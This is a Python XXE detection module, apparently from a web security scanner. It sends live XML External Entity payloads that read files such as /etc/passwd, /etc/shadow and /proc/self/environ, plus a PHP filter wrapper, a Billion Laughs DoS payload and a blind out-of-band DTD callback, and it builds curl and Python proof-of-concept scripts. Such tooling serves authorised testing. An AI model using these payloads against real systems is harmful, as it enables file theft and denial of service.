#!/usr/bin/env python3
"""
XXE (XML External Entity) Detection Module
==========================================

Comprehensive XML External Entity vulnerability detection.

Features:
- Classic XXE (file disclosure)
- Blind XXE (out-of-band detection)
- XXE DoS (Billion Laughs)
- PHP wrapper-based XXE
- Parameter entity XXE
- Automated PoC generation

Author: Llakterian (llakterian@gmail.com)
License: MIT
"""

import re
import logging
import base64
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
import requests
from urllib.parse import urlparse

logger = logging.getLogger(__name__)


@dataclass
class XXEVulnerability:
    """XXE vulnerability data structure"""

    url: str
    parameter: str
    payload: str
    xxe_type: str  # 'classic', 'blind', 'dos'
    evidence: str
    severity: str
    cvss_score: float
    file_disclosed: Optional[str]
    poc_curl: str
    poc_python: str


class XXEDetector:
    """XXE vulnerability detection"""

    # Files to attempt disclosure
    TARGET_FILES = [
        "/etc/passwd",
        "/etc/hosts",
        "/etc/hostname",
        "/proc/self/environ",
        "/proc/version",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\boot.ini",
        "/etc/group",
        "/etc/shadow",
        "/var/www/html/index.php",
    ]

    # XXE indicators in responses
    XXE_INDICATORS = [
        "root:x:",  # /etc/passwd
        "localhost",
        "127.0.0.1",
        "<?xml",
        "ENTITY",
        "DOCTYPE",
        "bin/bash",
        "sbin/nologin",
        "[boot loader]",  # boot.ini
        "<?php",
    ]

    def __init__(self, session: requests.Session, marker: str):
        self.session = session
        self.marker = marker
        self.vulnerabilities: List[XXEVulnerability] = []
        self.oob_server = None  # For blind XXE detection

    def test_endpoint(self, url: str, method: str = "POST") -> List[XXEVulnerability]:
        """Test an endpoint for XXE vulnerabilities"""
        vulnerabilities = []

        # Test classic XXE
        for target_file in self.TARGET_FILES:
            vuln = self._test_classic_xxe(url, method, target_file)
            if vuln:
                vulnerabilities.append(vuln)
                self.vulnerabilities.append(vuln)
                break  # One successful XXE is enough

        # Test PHP wrapper XXE
        if not vulnerabilities:
            vuln = self._test_php_wrapper_xxe(url, method)
            if vuln:
                vulnerabilities.append(vuln)
                self.vulnerabilities.append(vuln)

        # Test XXE DoS
        vuln = self._test_xxe_dos(url, method)
        if vuln:
            vulnerabilities.append(vuln)
            self.vulnerabilities.append(vuln)

        # Test blind XXE (if OOB server available)
        if self.oob_server:
            vuln = self._test_blind_xxe(url, method)
            if vuln:
                vulnerabilities.append(vuln)
                self.vulnerabilities.append(vuln)

        return vulnerabilities

    def _test_classic_xxe(
        self, url: str, method: str, target_file: str
    ) -> Optional[XXEVulnerability]:
        """Test for classic XXE (file disclosure)"""
        try:
            # Generate XXE payload
            payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{target_file}">
]>
<root>
  <data>&xxe;</data>
  <marker>{self.marker}</marker>
</root>"""

            # Send request
            headers = {
                "Content-Type": "application/xml",
                "Accept": "application/xml, text/xml, */*",
            }

            response = self._send_xml_request(url, method, payload, headers)

            if not response:
                return None

            # Check for file disclosure
            if self._detect_file_disclosure(response.text, target_file):
                logger.info(f"🔓 XXE vulnerability found: {url} (file: {target_file})")

                poc_curl = self._generate_curl_poc(url, method, payload)
                poc_python = self._generate_python_poc(url, method, payload)

                return XXEVulnerability(
                    url=url,
                    parameter="XML body",
                    payload=payload,
                    xxe_type="classic",
                    evidence=f"File disclosure detected: {target_file}",
                    severity="High",
                    cvss_score=8.5,
                    file_disclosed=target_file,
                    poc_curl=poc_curl,
                    poc_python=poc_python,
                )

        except Exception as e:
            logger.debug(f"Classic XXE test failed: {e}")

        return None

    def _test_php_wrapper_xxe(
        self, url: str, method: str
    ) -> Optional[XXEVulnerability]:
        """Test for XXE using PHP wrappers (base64 encoding)"""
        try:
            target_file = "/etc/passwd"

            # PHP wrapper payload
            payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={target_file}">
]>
<root>
  <data>&xxe;</data>
  <marker>{self.marker}</marker>
</root>"""

            headers = {"Content-Type": "application/xml"}

            response = self._send_xml_request(url, method, payload, headers)

            if not response:
                return None

            # Look for base64-encoded content
            if self._detect_base64_xxe(response.text):
                logger.info(f"🔓 XXE (PHP wrapper) vulnerability found: {url}")

                poc_curl = self._generate_curl_poc(url, method, payload)
                poc_python = self._generate_python_poc(url, method, payload)

                return XXEVulnerability(
                    url=url,
                    parameter="XML body",
                    payload=payload,
                    xxe_type="classic",
                    evidence="Base64-encoded file content detected (PHP wrapper)",
                    severity="High",
                    cvss_score=8.0,
                    file_disclosed=target_file,
                    poc_curl=poc_curl,
                    poc_python=poc_python,
                )

        except Exception as e:
            logger.debug(f"PHP wrapper XXE test failed: {e}")

        return None

    def _test_xxe_dos(self, url: str, method: str) -> Optional[XXEVulnerability]:
        """Test for XXE DoS (Billion Laughs)"""
        try:
            # Billion Laughs payload (limited for safety)
            payload = f"""<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>
  <data>&lol4;</data>
  <marker>{self.marker}</marker>
</root>"""

            headers = {"Content-Type": "application/xml"}

            import time

            start_time = time.time()

            response = self._send_xml_request(url, method, payload, headers, timeout=15)

            response_time = time.time() - start_time

            # If server takes long time or times out, might be vulnerable to XXE DoS
            if response_time > 10 or not response:
                logger.info(f"⚠️ Possible XXE DoS vulnerability: {url}")

                poc_curl = self._generate_curl_poc(url, method, payload)
                poc_python = self._generate_python_poc(url, method, payload)

                return XXEVulnerability(
                    url=url,
                    parameter="XML body",
                    payload=payload,
                    xxe_type="dos",
                    evidence=f"Server response time: {response_time:.2f}s (possible DoS)",
                    severity="Medium",
                    cvss_score=5.5,
                    file_disclosed=None,
                    poc_curl=poc_curl,
                    poc_python=poc_python,
                )

        except requests.Timeout:
            logger.info(f"⚠️ XXE DoS detected (timeout): {url}")
            poc_curl = self._generate_curl_poc(url, method, payload)
            poc_python = self._generate_python_poc(url, method, payload)

            return XXEVulnerability(
                url=url,
                parameter="XML body",
                payload=payload,
                xxe_type="dos",
                evidence="Server timeout on XML bomb (Billion Laughs DoS)",
                severity="Medium",
                cvss_score=5.5,
                file_disclosed=None,
                poc_curl=poc_curl,
                poc_python=poc_python,
            )
        except Exception as e:
            logger.debug(f"XXE DoS test failed: {e}")

        return None

    def _test_blind_xxe(self, url: str, method: str) -> Optional[XXEVulnerability]:
        """Test for blind XXE (out-of-band)"""
        if not self.oob_server:
            return None

        try:
            # Blind XXE payload with DTD callback
            payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{self.oob_server}/xxe.dtd">
  %xxe;
]>
<root>
  <marker>{self.marker}</marker>
</root>"""

            headers = {"Content-Type": "application/xml"}

            response = self._send_xml_request(url, method, payload, headers)

            # Check OOB server for callback (implementation depends on your setup)
            # For now, we'll skip actual verification
            # In production, you'd check if your OOB server received a request

            logger.debug(f"Blind XXE test sent to: {url}")

        except Exception as e:
            logger.debug(f"Blind XXE test failed: {e}")

        return None

    def _send_xml_request(
        self,
        url: str,
        method: str,
        payload: str,
        headers: Dict,
        timeout: int = 10,
    ) -> Optional[requests.Response]:
        """Send XML request"""
        try:
            if method.upper() == "POST":
                response = self.session.post(
                    url, data=payload, headers=headers, timeout=timeout
                )
            elif method.upper() == "PUT":
                response = self.session.put(
                    url, data=payload, headers=headers, timeout=timeout
                )
            else:
                response = self.session.request(
                    method, url, data=payload, headers=headers, timeout=timeout
                )

            return response

        except requests.Timeout:
            raise
        except Exception as e:
            logger.debug(f"XML request failed: {e}")
            return None

    def _detect_file_disclosure(self, response_text: str, target_file: str) -> bool:
        """Detect if file was disclosed in response"""
        response_lower = response_text.lower()

        # Check for specific file indicators
        for indicator in self.XXE_INDICATORS:
            if indicator.lower() in response_lower:
                return True

        # Check for /etc/passwd specific patterns
        if "/etc/passwd" in target_file:
            if re.search(r"root:[^:]*:[0-9]+:[0-9]+:", response_text):
                return True

        # Check for Windows hosts file
        if "hosts" in target_file.lower():
            if "127.0.0.1" in response_text and "localhost" in response_text:
                return True

        return False

    def _detect_base64_xxe(self, response_text: str) -> bool:
        """Detect base64-encoded content in response (PHP wrapper XXE)"""
        # Look for base64 patterns
        base64_pattern = r"[A-Za-z0-9+/]{40,}={0,2}"
        matches = re.findall(base64_pattern, response_text)

        for match in matches:
            try:
                decoded = base64.b64decode(match).decode("utf-8", errors="ignore")
                # Check if decoded content looks like /etc/passwd
                if "root:" in decoded or "bin/bash" in decoded:
                    return True
            except Exception:
                continue

        return False

    def _generate_curl_poc(self, url: str, method: str, payload: str) -> str:
        """Generate cURL PoC"""
        escaped_payload = payload.replace("'", "'\\''")

        poc = f"""# XXE PoC - cURL

curl -X {method} "{url}" \\
  -H "Content-Type: application/xml" \\
  -H "Accept: application/xml" \\
  -d '{escaped_payload}' \\
  --insecure

# Expected: File contents in response or timeout (DoS)
"""
        return poc

    def _generate_python_poc(self, url: str, method: str, payload: str) -> str:
        """Generate Python PoC"""
        poc = f'''#!/usr/bin/env python3
"""XXE Proof of Concept"""

import requests

url = "{url}"
headers = {{
    "Content-Type": "application/xml",
    "Accept": "application/xml"
}}

payload = """{payload}"""

print(f"[*] Testing XXE on: {{url}}")
print(f"[*] Payload length: {{len(payload)}} bytes")

try:
    response = requests.{method.lower()}(
        url,
        data=payload,
        headers=headers,
        timeout=15,
        verify=False
    )

    print(f"[*] Status Code: {{response.status_code}}")
    print(f"[*] Response Length: {{len(response.text)}} bytes")
    print(f"\\n[*] Response Preview:")
    print(response.text[:500])

    # Check for file disclosure indicators
    if "root:" in response.text or "localhost" in response.text:
        print("\\n[!] XXE CONFIRMED - File disclosure detected!")

except requests.Timeout:
    print("[!] REQUEST TIMED OUT - Possible XXE DoS vulnerability")
except Exception as e:
    print(f"[!] Error: {{e}}")
'''
        return poc

    def test_parameter_xxe(
        self, url: str, param_name: str, method: str = "POST"
    ) -> Optional[XXEVulnerability]:
        """Test a specific parameter for XXE"""
        try:
            payload = f"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>"""

            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            data = {param_name: payload}

            if method.upper() == "POST":
                response = self.session.post(
                    url, data=data, headers=headers, timeout=10
                )
            else:
                response = self.session.get(url, params=data, timeout=10)

            if self._detect_file_disclosure(response.text, "/etc/passwd"):
                logger.info(f"🔓 XXE via parameter '{param_name}': {url}")

                poc_curl = f'curl -X {method} "{url}" -d "{param_name}={payload}"'
                poc_python = f'requests.{method.lower()}("{url}", data={{"{param_name}": "{payload}"}})'

                return XXEVulnerability(
                    url=url,
                    parameter=param_name,
                    payload=payload,
                    xxe_type="parameter",
                    evidence=f"XXE in parameter: {param_name}",
                    severity="High",
                    cvss_score=8.5,
                    file_disclosed="/etc/passwd",
                    poc_curl=poc_curl,
                    poc_python=poc_python,
                )

        except Exception as e:
            logger.debug(f"Parameter XXE test failed: {e}")

        return None

    def generate_report(self) -> Dict:
        """Generate XXE vulnerability report"""
        return {
            "total_vulnerabilities": len(self.vulnerabilities),
            "vulnerabilities": [
                {
                    "url": v.url,
                    "parameter": v.parameter,
                    "xxe_type": v.xxe_type,
                    "severity": v.severity,
                    "cvss_score": v.cvss_score,
                    "evidence": v.evidence,
                    "file_disclosed": v.file_disclosed,
                    "poc_available": True,
                }
                for v in self.vulnerabilities
            ],
        }

    def set_oob_server(self, server_url: str):
        """Set out-of-band server for blind XXE detection"""
        self.oob_server = server_url
        logger.info(f"🌐 OOB server set for blind XXE: {server_url}")
